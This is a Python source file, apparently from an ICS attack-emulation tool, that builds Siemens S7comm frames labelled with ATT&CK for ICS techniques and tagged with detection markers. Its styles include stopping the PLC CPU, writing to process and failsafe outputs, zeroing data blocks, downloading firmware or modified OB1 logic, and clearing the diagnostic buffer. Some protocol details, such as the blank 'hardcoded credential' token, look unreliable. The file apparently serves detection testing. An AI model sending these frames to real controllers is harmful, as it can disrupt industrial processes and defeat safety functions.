# ICSForge S7comm payload builder — upgraded for ATT&CK for ICS realism
# TPKT (RFC1006) + COTP + S7comm proper PDU structure
import random
import struct

from .common import marker_bytes

# S7comm ROSCTR (PDU types)
ROSCTR_JOB     = 0x01  # Request (master → PLC)
ROSCTR_ACK     = 0x02  # Acknowledgement
ROSCTR_ACK_DATA= 0x03  # Acknowledgement with data
ROSCTR_USERDATA= 0x07  # Userdata (SZL, CPU functions)

# S7comm Function codes (job ROSCTR)
FC_READ_VAR    = 0x04
FC_WRITE_VAR   = 0x05
FC_REQUEST_DL  = 0x1A  # Request download (program download start)
FC_DOWNLOAD_BLK= 0x1B  # Download block
FC_DOWNLOAD_END= 0x1C  # Download ended
FC_REQUEST_UL  = 0x1D  # Request upload
FC_UPLOAD_BLK  = 0x1E  # Upload block
FC_UPLOAD_END  = 0x1F  # Upload ended
FC_PLC_CONTROL = 0x28  # PLC Control (start/stop/etc)
FC_PLC_STOP    = 0x29  # PLC Stop

# S7 area codes (for var access)
AREA_DB        = 0x84  # Data Block
AREA_INPUTS    = 0x81  # Process Inputs
AREA_OUTPUTS   = 0x82  # Process Outputs
AREA_FLAGS     = 0x83  # Flags (Merker)
AREA_TIMERS    = 0x1D  # Timers
AREA_COUNTERS  = 0x1C  # Counters

# Transport size for var items
TSIZE_BYTE = 0x02
TSIZE_WORD = 0x04
TSIZE_DWORD= 0x06


def _tpkt_cotp(s7_payload: bytes) -> bytes:
    """Wrap S7 payload in TPKT + COTP Data TPDU."""
    cotp = b"\x02\xF0\x80"  # length=2, PDU type=Data(0xF0), TPDU-NR=0x80
    total = 4 + len(cotp) + len(s7_payload)
    tpkt  = struct.pack(">BBH", 0x03, 0x00, total)
    return tpkt + cotp + s7_payload


def _s7_header(rosctr: int, pdu_ref: int, param_len: int, data_len: int) -> bytes:
    return struct.pack(">BBHHHHH",
        0x32,       # Protocol ID
        rosctr,     # PDU type
        0x0000,     # Reserved
        pdu_ref,    # PDU reference (seq)
        param_len,
        data_len,
        0x0000,     # Error class + code (0 = no error)
    )[:10]  # trim to 10 bytes (no error word in JOB)


def _s7_job_header(pdu_ref: int, param_len: int, data_len: int = 0) -> bytes:
    """S7 header for ROSCTR_JOB (no error word)."""
    return struct.pack(">BBHHH",
        0x32, ROSCTR_JOB, 0x0000, pdu_ref & 0xFFFF,
        param_len & 0xFFFF) + struct.pack(">H", data_len & 0xFFFF)


def _var_item(area: int, db_num: int, byte_addr: int, bit_addr: int = 0,
              length: int = 1, tsize: int = TSIZE_WORD) -> bytes:
    """
    S7 variable addressing item — exactly 12 bytes.
    Wire format (S7ANY syntax):
      [0]    item_spec  = 0x12
      [1]    item_len   = 0x0A  (10 more bytes follow)
      [2]    syntax_id  = 0x10  (S7ANY)
      [3]    tsize      (transport size: TSIZE_BIT/BYTE/WORD/DWORD)
      [4-5]  length     (big-endian, number of elements)
      [6-7]  db_num     (big-endian, 0 for non-DB areas)
      [8]    area       (0x81=inputs, 0x82=outputs, 0x83=M, 0x84=DB, ...)
      [9-11] bit_addr   (bit address: byte_offset*8 + bit, packed in 3 bytes)
    """
    # Bit address: byte_addr * 8 + bit_addr, encoded big-endian in 3 bytes
    bit_offset = byte_addr * 8 + bit_addr
    return struct.pack(">BBBBHH",
        0x12,           # item spec
        0x0A,           # item length (10 bytes follow)
        0x10,           # syntax id = S7ANY
        tsize & 0xFF,
        length & 0xFFFF,
        db_num & 0xFFFF,
    ) + bytes([
        area & 0xFF,
        (bit_offset >> 16) & 0xFF,
        (bit_offset >>  8) & 0xFF,
        bit_offset         & 0xFF,
    ])



def _s7_userdata_header(pdu_ref: int, param_len: int, data_len: int = 0) -> bytes:
    """S7 header for ROSCTR_USERDATA (0x07) — 12 bytes including error word."""
    return struct.pack(">BBHHHH BB",
        0x32, ROSCTR_USERDATA, 0x0000, pdu_ref & 0xFFFF,
        param_len & 0xFFFF, data_len & 0xFFFF,
        0x00, 0x00,  # error_class=0x00, error_code=0x00 (no error)
    )

def build_payload(marker: str, style: str = "read_var", **kwargs) -> bytes:
    """
    Build S7comm/TPKT frame.

    Styles:
      setup              ROSCTR_JOB FC_READ_VAR — T0840 initial negotiation
      read_var           FC04 — T0801 Monitor Process State / T0882
      write_var          FC05 — T0855 Unauthorized Command / T0831 Manipulation
      cpu_stop           FC29 — T0813 Denial of Control / T0881 Service Stop
      cpu_start_warm     FC28 ctrl=WARM — T0816 Device Restart
      cpu_start_cold     FC28 ctrl=COLD — T0816 Device Restart
      download_req       FC1A — T0821 Modify Controller Tasking / T0843
      download_block     FC1B — T0824 Full Program Download
      download_end       FC1C — T0821 end of download
      upload_req         FC1D — T0845 Program Upload
      upload_block       FC1E — T0845 upload data
      upload_end         FC1F — T0845 end
      szl_read           ROSCTR_USERDATA SZL-ID — T0868/T0882 Theft of Info
      plc_control        FC28 — T0875 Change Program State
      read_db            FC04 area=DB — T0882 systematic DB extraction
      write_db           FC05 area=DB — T0836 Modify Parameter
      read_outputs       FC04 area=OUTPUTS — T0801 output monitoring
      write_outputs      FC05 area=OUTPUTS — T0876 Loss of Safety
    """
    rnd     = random.Random(kwargs.get("seed"))
    # Monotonic PDU reference from engine; None → random per packet
    pdu_ref = (int(kwargs.get("s7_pdu_ref")) & 0xFFFF) if kwargs.get("s7_pdu_ref") is not None else rnd.randint(1, 0xFFFF)
    mb      = marker_bytes(marker)

    if style == "setup":
        # Communications Setup (negotiate PDU size)
        param = struct.pack(">BBHHH", 0xF0, 0x00, 0x0001, 0x0001, 0x01E0)  # max PDU=480
        s7    = _s7_job_header(pdu_ref, len(param)) + param + mb

    elif style == "read_var":
        addr   = int(kwargs.get("byte_addr", rnd.randint(0, 200)))
        item   = _var_item(AREA_FLAGS, 0, addr, tsize=TSIZE_BYTE)
        param  = bytes([FC_READ_VAR, 0x01]) + item
        s7     = _s7_job_header(pdu_ref, len(param)) + param + mb

    elif style == "write_var":
        addr   = int(kwargs.get("byte_addr", rnd.randint(0, 200)))
        value  = int(kwargs.get("value",     rnd.randint(0, 0xFF)))
        item   = _var_item(AREA_OUTPUTS, 0, addr, tsize=TSIZE_BYTE)
        data_item = bytes([0x00, 0x04, 0x00, 0x08, value & 0xFF])
        param  = bytes([FC_WRITE_VAR, 0x01]) + item
        s7     = _s7_job_header(pdu_ref, len(param), len(data_item)) + param + data_item + mb

    elif style == "cpu_stop":
        # PLC Stop — T0813 Denial of Control / T0881 Service Stop
        pi_service = b"\x50\x5F\x50\x52\x4F\x47\x52\x41\x4D"  # '_PROGRAM' in Siemens naming
        param  = bytes([FC_PLC_STOP, 0x00, 0x00, 0x00, 0x00, 0x00, len(pi_service)]) + pi_service
        s7     = _s7_job_header(pdu_ref, len(param)) + param + mb

    elif style == "cpu_start_warm":
        # Warm Start — T0816 Device Restart
        pi_service = b"\x50\x5F\x50\x52\x4F\x47\x52\x41\x4D"
        param  = bytes([FC_PLC_CONTROL, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFD,
                        0x00, 0x00, len(pi_service)]) + pi_service
        s7     = _s7_job_header(pdu_ref, len(param)) + param + mb

    elif style == "cpu_start_cold":
        # Cold Start — T0816 Device Restart
        pi_service = b"\x43\x4F\x4C\x44\x53\x54\x41\x52\x54"  # 'COLDSTART'
        param  = bytes([FC_PLC_CONTROL, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFD,
                        0x00, 0x00, len(pi_service)]) + pi_service
        s7     = _s7_job_header(pdu_ref, len(param)) + param + mb

    elif style == "download_req":
        # Request download of OB1 — T0821/T0843
        block_id = b"\x5F\x30\x41\x00\x30\x31"  # _0A01 (OB 1 identifier)
        param = bytes([FC_REQUEST_DL, 0x00]) + b"\x00\x00\x00\x00" + bytes([len(block_id)]) + block_id
        s7    = _s7_job_header(pdu_ref, len(param)) + param + mb

    elif style == "download_block":
        # Download block data chunk — T0824 Full Program Download
        chunk_size = rnd.randint(64, 240)
        chunk_data = bytes([rnd.randint(0, 0xFF) for _ in range(chunk_size)])
        param = bytes([FC_DOWNLOAD_BLK, 0x00]) + struct.pack(">H", chunk_size) + b"\x00\x00"
        s7    = _s7_job_header(pdu_ref, len(param), len(chunk_data)) + param + chunk_data + mb

    elif style == "download_end":
        param = bytes([FC_DOWNLOAD_END, 0x00]) + b"\x00\x00\x00\x00"
        s7    = _s7_job_header(pdu_ref, len(param)) + param + mb

    elif style == "upload_req":
        # Request upload of OB1 — T0845
        block_id = b"\x5F\x30\x41\x00\x30\x31"
        param = bytes([FC_REQUEST_UL, 0x00]) + b"\x00\x00\x00\x00" + bytes([len(block_id)]) + block_id
        s7    = _s7_job_header(pdu_ref, len(param)) + param + mb

    elif style == "upload_block":
        param = bytes([FC_UPLOAD_BLK, 0x00]) + b"\x00\x00\x00\x00"
        s7    = _s7_job_header(pdu_ref, len(param)) + param + mb

    elif style == "upload_end":
        param = bytes([FC_UPLOAD_END, 0x00]) + b"\x00\x00\x00\x00"
        s7    = _s7_job_header(pdu_ref, len(param)) + param + mb

    elif style == "szl_read":
        # SZL/SSL read via ROSCTR_USERDATA — T0868/T0882
        # Subfunction = 0x44 (read SZL), SZL-ID 0x0011 (component info)
        # USERDATA param block: method(1)+type(1)+subfunction(1)+seq(1) = 4 bytes
        # Then SZL data: szl_id(2)+szl_idx(2)
        szl_id  = int(kwargs.get("szl_id", 0x0011)) & 0xFFFF
        szl_idx = int(kwargs.get("szl_idx", 0x0000)) & 0xFFFF
        # USERDATA function parameter: class=0x11 (CPU func), fn=0x44 (SZL read), seq=0x01, reserved=0x00
        param2  = bytes([0x00, 0x01, 0x12, 0x04, 0x11, 0x44, 0x01, 0x00])
        szl_req = struct.pack(">HH", szl_id, szl_idx)
        s7      = _s7_userdata_header(pdu_ref, len(param2), len(szl_req)) + param2 + szl_req + mb

    elif style == "plc_control":
        # Generic PLC control (ROSCTR=JOB, FC=0x28) — T0875 Change Program State
        pi_name = kwargs.get("pi_service", b"P_PROGRAM")
        if isinstance(pi_name, str):
            pi_name = pi_name.encode()
        param = bytes([FC_PLC_CONTROL, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFD,
                       0x00, 0x00, len(pi_name)]) + pi_name
        s7    = _s7_job_header(pdu_ref, len(param)) + param + mb

    elif style == "read_db":
        # Read from Data Block — T0882 systematic extraction
        db_num = int(kwargs.get("db_num",   rnd.randint(1, 50))) & 0xFFFF
        byte_a = int(kwargs.get("byte_addr",rnd.randint(0, 200)))
        item   = _var_item(AREA_DB, db_num, byte_a, tsize=TSIZE_WORD)
        param  = bytes([FC_READ_VAR, 0x01]) + item
        s7     = _s7_job_header(pdu_ref, len(param)) + param + mb

    elif style == "write_db":
        # Write to Data Block — T0836 Modify Parameter
        db_num = int(kwargs.get("db_num",   rnd.randint(1, 50))) & 0xFFFF
        byte_a = int(kwargs.get("byte_addr",rnd.randint(0, 200)))
        value  = int(kwargs.get("value",    rnd.randint(0, 0xFFFF))) & 0xFFFF
        item   = _var_item(AREA_DB, db_num, byte_a, tsize=TSIZE_WORD)
        data_item = struct.pack(">BBHH", 0x00, 0x04, 0x00, 0x10) + struct.pack(">H", value)
        param  = bytes([FC_WRITE_VAR, 0x01]) + item
        s7     = _s7_job_header(pdu_ref, len(param), len(data_item)) + param + data_item + mb

    elif style == "read_outputs":
        # Read process outputs — T0801 output monitoring
        qty    = int(kwargs.get("quantity", rnd.randint(1, 8)))
        byte_a = int(kwargs.get("byte_addr", 0))
        item   = _var_item(AREA_OUTPUTS, 0, byte_a, length=qty, tsize=TSIZE_BYTE)
        param  = bytes([FC_READ_VAR, 0x01]) + item
        s7     = _s7_job_header(pdu_ref, len(param)) + param + mb

    elif style == "write_outputs":
        # Write to process outputs — T0876 Loss of Safety
        byte_a = int(kwargs.get("byte_addr", rnd.randint(0, 64)))
        value  = int(kwargs.get("value",     0x00)) & 0xFF
        item   = _var_item(AREA_OUTPUTS, 0, byte_a, tsize=TSIZE_BYTE)
        data_item = bytes([0x00, 0x04, 0x00, 0x08, value])
        param  = bytes([FC_WRITE_VAR, 0x01]) + item
        s7     = _s7_job_header(pdu_ref, len(param), len(data_item)) + param + data_item + mb

    elif style == "read_inputs":
        # Read AREA_INPUTS (process input image) — T0877 I/O Image
        qty    = int(kwargs.get("quantity", rnd.randint(4, 16)))
        byte_a = int(kwargs.get("byte_addr", 0))
        item   = _var_item(AREA_INPUTS, 0, byte_a, length=qty, tsize=TSIZE_BYTE)
        param  = bytes([FC_READ_VAR, 0x01]) + item
        s7     = _s7_job_header(pdu_ref, len(param)) + param + mb

    elif style == "write_inputs":
        # Write to AREA_INPUTS (normally read-only) — T0835 Manipulate I/O Image
        # Attacker forces PLC to see false sensor values
        byte_a = int(kwargs.get("byte_addr", rnd.randint(0, 32)))
        value  = int(kwargs.get("value", rnd.randint(0, 0xFF))) & 0xFF
        item   = _var_item(AREA_INPUTS, 0, byte_a, tsize=TSIZE_BYTE)
        data_item = bytes([0x00, 0x04, 0x00, 0x08, value])
        param  = bytes([FC_WRITE_VAR, 0x01]) + item
        s7     = _s7_job_header(pdu_ref, len(param), len(data_item)) + param + data_item + mb

    elif style == "zero_db":
        # Write zeros to entire Data Block — T0809 Data Destruction
        db_num = int(kwargs.get("db_num", rnd.randint(1, 20))) & 0xFFFF
        qty    = int(kwargs.get("quantity", rnd.randint(20, 80)))
        item   = bytes([0x12, 0x0A, 0x10, 0x04,
                        0x00, qty & 0xFF,
                        (db_num >> 8) & 0xFF, db_num & 0xFF,
                        AREA_DB,
                        0x00, 0x00, 0x00])
        data_item = struct.pack(">BBH", 0x00, 0x04, qty * 16) + b"\x00" * (qty * 2)
        param  = bytes([FC_WRITE_VAR, 0x01]) + item
        s7     = _s7_job_header(pdu_ref, len(param), len(data_item)) + param + data_item + mb

    elif style == "firmware_module":
        # Download SDB block (module firmware) — T0839 Module Firmware
        # SDB = System Data Block; type 0x38 = module firmware block
        block_id = b"\x5F\x33\x38\x00\x30\x31"  # _38\x00 01 (SDB block type 0x38 = module FW)
        param  = bytes([FC_REQUEST_DL, 0x00]) + b"\x00\x00\x00\x00" + bytes([len(block_id)]) + block_id
        s7     = _s7_job_header(pdu_ref, len(param)) + param + mb

    elif style == "firmware_full":
        # Download SDB0 (full system firmware replacement) — T0857 System Firmware
        # SDB0 = System Data Block 0 = complete firmware image
        block_id = b"\x5F\x33\x38\x00\x30\x30"  # _38\x00 00 (SDB 0)
        chunk    = bytes([rnd.randint(0, 0xFF) for _ in range(240)])
        param    = bytes([FC_REQUEST_DL, 0x00]) + b"\x00\x00\x00\x00" + bytes([len(block_id)]) + block_id
        s7       = _s7_job_header(pdu_ref, len(param), len(chunk)) + param + chunk + mb

    elif style == "download_sdb0":
        # Download block chunk for SDB0 firmware — T0895 Autorun Image
        # SDB0 is loaded on every PLC boot cycle
        chunk  = bytes([rnd.randint(0, 0xFF) for _ in range(200)])
        param  = bytes([FC_DOWNLOAD_BLK, 0x00]) + struct.pack(">H", len(chunk)) + b"\x00\x00"
        s7     = _s7_job_header(pdu_ref, len(param), len(chunk)) + param + chunk + mb

    elif style == "szl_clear":
        # SZL USERDATA request to clear diagnostic buffer — T0872 Indicator Removal on Host
        # Subfunction 0x4F = clear diag buffer, class=0x11
        param2  = bytes([0x00, 0x01, 0x12, 0x04, 0x11, 0x4F, 0x01, 0x00])  # clear subfunction
        szl_req = struct.pack(">HH", 0x0F11, 0x0000)
        s7      = _s7_userdata_header(pdu_ref, len(param2), len(szl_req)) + param2 + szl_req + mb

    elif style == "program_mode":
        # Set PLC to PROGRAM mode (allows ladder logic writes) — T0858 Change Operating Mode
        pi_name = b"P_PROGRAM"
        # Mode 0xFD = program, 0xFE = run, 0x00 = stop
        param  = bytes([FC_PLC_CONTROL, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFD,
                        0x00, 0x00, len(pi_name)]) + pi_name
        s7     = _s7_job_header(pdu_ref, len(param)) + param + mb

    elif style == "write_failsafe":
        # Write to F-CPU (failsafe) output area — T0880 Loss of Safety
        # F-CPUs (315F, 317F) have safety-rated outputs at area 0x82 with F-module addressing
        byte_a = int(kwargs.get("byte_addr", rnd.randint(0, 16)))
        item   = _var_item(AREA_OUTPUTS, 0, byte_a, length=4, tsize=TSIZE_BYTE)
        data_item = bytes([0x00, 0x04, 0x00, 0x20, 0x00, 0x00, 0x00, 0x00])  # all zeros
        param  = bytes([FC_WRITE_VAR, 0x01]) + item
        s7     = _s7_job_header(pdu_ref, len(param), len(data_item)) + param + data_item + mb

    elif style == "malformed_param":
        # Oversized parameter block — T0866 Exploitation of Remote Services
        # Sends more parameters than PDU negotiation allows, triggering exception
        bad_param = bytes([FC_READ_VAR, 0xFF]) + b"\x12\x0A\x10\x02" * 20  # 20 items, way over limit
        s7    = _s7_job_header(pdu_ref, len(bad_param)) + bad_param + mb

    elif style == "hardcoded_creds":
        # S7comm setup with hardcoded Siemens default auth — T0891 Hardcoded Credentials
        # Siemens S7-300/400 with no password protection uses blank auth in setup PDU
        param  = struct.pack(">BBHHH", 0xF0, 0x00, 0x0001, 0x0001, 0x01E0)
        # Append known hardcoded session token (empty = default Siemens credential)
        auth   = b"\x00" * 4  # blank password token
        s7     = _s7_job_header(pdu_ref, len(param) + len(auth)) + param + auth + mb

    elif style == "tool_transfer_db":
        # Download large binary blob as DB block — T0867 Lateral Tool Transfer
        # Attacker encodes a tool payload inside a Siemens DB block
        db_size = int(kwargs.get("size", rnd.randint(180, 240)))
        chunk   = bytes([rnd.randint(0x20, 0x7E) for _ in range(db_size)])  # printable-range binary
        param   = bytes([FC_DOWNLOAD_BLK, 0x00]) + struct.pack(">H", db_size) + b"\x00\x00"
        s7      = _s7_job_header(pdu_ref, len(param), db_size) + param + chunk + mb

    elif style == "default_creds":
        # S7comm session with vendor default (blank) password — T0812 Default Credentials
        param  = struct.pack(">BBHHH", 0xF0, 0x00, 0x0001, 0x0001, 0x00F0)
        s7     = _s7_job_header(pdu_ref, len(param)) + param + mb

    elif style == "read_all_dbs":
        # Systematically read multiple DB blocks — T0811/T0893 Data from Local System
        db_num = int(kwargs.get("db_num", rnd.randint(1, 100))) & 0xFFFF
        item   = _var_item(AREA_DB, db_num, 0, length=126, tsize=TSIZE_WORD)
        param  = bytes([FC_READ_VAR, 0x01]) + item
        s7     = _s7_job_header(pdu_ref, len(param)) + param + mb

    elif style == "modify_ob1":
        # Upload OB1, then re-download modified — T0873 Project File Infection / T0889 Modify Program
        # This frame: upload request to read current OB1
        block_id = b"\x5F\x30\x41\x00\x30\x31"  # OB1
        param  = bytes([FC_REQUEST_UL, 0x00]) + b"\x00\x00\x00\x00" + bytes([len(block_id)]) + block_id
        s7     = _s7_job_header(pdu_ref, len(param)) + param + mb

    elif style == "modified_ob1_dl":
        # Download modified OB1 back — T0873 / T0889 second phase
        block_id = b"\x5F\x30\x41\x00\x30\x31"
        param  = bytes([FC_REQUEST_DL, 0x00]) + b"\x00\x00\x00\x00" + bytes([len(block_id)]) + block_id
        s7     = _s7_job_header(pdu_ref, len(param)) + param + mb

    elif style == "native_cotp":
        # Raw COTP connection request without S7 layer — T0834 Native API
        # Connects at transport layer only, using lower-level COTP API directly
        cotp_cr = b"\x0B\xE0\x00\x00\x00\x01\x00\xC0\x01\x0A\xC1\x02\x01\x00"
        total   = 4 + len(cotp_cr)
        tpkt    = struct.pack(">BBH", 0x03, 0x00, total)
        s7      = cotp_cr + mb
        return tpkt + s7  # return early, bypass _tpkt_cotp

    elif style == "lateral_pivot":
        # S7comm session from unexpected IP to establish beachhead — T0886 Remote Services
        param  = struct.pack(">BBHHH", 0xF0, 0x00, 0x0001, 0x0001, 0x01E0)
        s7     = _s7_job_header(pdu_ref, len(param)) + param + mb

    else:
        # Fallback: read_var
        item  = bytes([0x12, 0x0A, 0x10, 0x02, 0x00, 0x01, 0x00, 0x00, AREA_FLAGS, 0x00, 0x00, 0x00])
        param = bytes([FC_READ_VAR, 0x01]) + item
        s7    = _s7_job_header(pdu_ref, len(param)) + param + mb

    return _tpkt_cotp(s7)
